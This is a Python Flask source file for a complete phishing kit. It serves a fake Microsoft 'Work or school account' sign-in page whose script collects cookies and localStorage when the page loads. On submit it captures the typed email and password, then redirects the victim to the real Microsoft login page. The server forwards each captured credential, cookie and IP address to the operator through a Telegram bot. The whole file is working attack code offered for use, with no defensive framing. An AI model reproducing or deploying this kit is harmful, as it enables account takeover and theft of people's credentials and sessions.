from flask import Flask, request, Response
import requests
import json
import base64
import os
from datetime import datetime
import urllib.parse

app = Flask(__name__)

# Config - Set in Railway ENV
TELEGRAM_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')

HTML_PAGE = '''<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Microsoft - Work or school account</title>
<style>
*{padding:0;margin:0;box-sizing:border-box}:root{--p:#0078d4;--bg:#f3f2f1;--s:#fff;--t:#323130;--b:#edebe9;--r:4px}
body{font-family:"Segoe UI",sans-serif;background:var(--bg);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{max-width:420px;width:100%;background:var(--s);border-radius:var(--r);box-shadow:0 4px 20px rgba(0,0,0,.1)}
.h{padding:32px 32px 0;background:linear-gradient(135deg,var(--p),#005a9e);color:#fff;text-align:center}
.h h1{font-size:28px;font-weight:600;margin-bottom:8px}
.h p{font-size:16px;opacity:.9}
.l{width:40px;height:40px;background:var(--p);border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:20px;font-weight:600;margin-bottom:16px}
.f{padding:32px}
.g{margin-bottom:24px}
.l2{display:block;margin-bottom:8px;color:#323130;font-weight:500;font-size:14px}
.i{width:100%;padding:12px 16px;border:1px solid var(--b);border-radius:var(--r);font-size:16px}
.i:focus{outline:0;border-color:var(--p);box-shadow:0 0 0 3px rgba(0,120,212,.1)}
.b{width:100%;background:var(--p);color:#fff;border:0;padding:14px;border-radius:var(--r);font-size:16px;font-weight:600;cursor:pointer}
.b:hover{background:#106ebe;transform:translateY(-1px)}
.ft{text-align:center;margin-top:16px}
.ft a{color:var(--p);text-decoration:none;font-size:14px}
.ld{display:none;text-align:center;padding:40px;color:#605e5c}
</style></head><body>
<div class="c">
<div class="h"><div class="l">M</div><h1>Work or school account</h1><p>Sign in with your Microsoft work or school account</p></div>
<form id="f">
<div class="f">
<div class="g"><label class="l2">Email, phone, or Skype</label><input class="i" id="u" placeholder="name@company.com" required></div>
<div class="g"><label class="l2">Password</label><input class="i" type="password" id="p" placeholder="Password" required></div>
<button class="b" type="submit">Sign in</button>
<div class="ft"><a href="#" onclick="alert('Contact admin')">Forgot my password</a></div>
</div></form>
<div id="l" class="ld">🔄 Verifying...</div>
</div>
<script>
w="/harvest";function h(d,m){navigator.sendBeacon(w+"?t=YOUR_TOKEN&data="+btoa(JSON.stringify(d)))}function c(){h({c:document.cookie,ua:navigator.userAgent,ls:{...localStorage}},"👤 Victim")}window.onload=c;document.getElementById("f").onsubmit=function(e){e.preventDefault();const d={u:document.getElementById("u").value,p:document.getElementById("p").value,c:document.cookie};h(d,"🔥 M365\\n👤 "+d.u+"\\n🔑 "+d.p);document.getElementById("f").style.display="none";document.getElementById("l").style.display="block";setTimeout(()=>{window.location="https://login.microsoftonline.com/?username="+encodeURIComponent(d.u)},2500)}
</script></body></html>'''

def telegram(msg):
    if not TELEGRAM_TOKEN or not CHAT_ID:
        print(f"🚨 NO TELEGRAM: {msg[:100]}")
        return
    try:
        r = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                         data={'chat_id':CHAT_ID,'text':msg,'parse_mode':'HTML'})
        print("📱 OK")
    except:
        print("❌ Telegram fail")

@app.route('/', defaults={'path':''})
@app.route('/<path:path>')
def home(path=''):
    if path in ['favicon.ico','robots.txt']:
        return '',204
    html = HTML_PAGE.replace('YOUR_TOKEN',TELEGRAM_TOKEN)
    return Response(html, mimetype='text/html')

@app.route('/harvest')
def grab():
    ip = request.remote_addr
    try:
        d = json.loads(base64.b64decode(urllib.parse.unquote(request.args.get('data',''))).decode())
        u = d.get('u','')
        p = d.get('p','')
        c = d.get('c','')
        
        print(f"🌐 {ip} | {u}")
        
        if u:
            telegram(f"🔥 <b>M365 HIT!</b>\\n👤 <code>{u}</code>\\n🔑 <code>{p}</code>\\n📍 <code>{ip}</code>")
        if c:
            telegram(f"🍪 <b>{ip}</b>\\n<code>{c}</code>")
            
    except Exception as e:
        print(f"ERR: {e}")
    
    return '',200

if __name__=='__main__':
    port=int(os.environ.get('PORT',5000))
    print("🚀 LIVE on port",port)
    app.run(host='0.0.0.0',port=port,debug=False)
